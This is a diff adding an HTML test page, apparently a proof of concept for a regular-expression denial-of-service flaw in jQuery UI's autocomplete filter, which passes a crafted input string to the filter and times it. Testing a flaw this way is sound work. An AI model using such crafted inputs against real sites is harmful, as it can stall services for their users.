@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ReDoS Test</title>
+    <script src="../root/js/jquery-1.6.4.min.js"></script>
+    <script src="../root/js/jquery-ui-1.85.js"></script>
+    <script>
+        // Test function to demonstrate the vulnerability
+        function testReDoS() {
+            // Create a malicious input pattern
+            var maliciousInput = "a".repeat(100) + "!" + "a".repeat(100);
+            console.time('regex-test');
+            // This will trigger the vulnerable code
+            $.ui.autocomplete.filter(["test"], maliciousInput);
+            console.timeEnd('regex-test');
+        }
+    </script>
+</head>
+<body>
+    <input type="text" id="test-input">
+    <button onclick="testReDoS()">Test ReDoS</button>
+</body>
+</html>
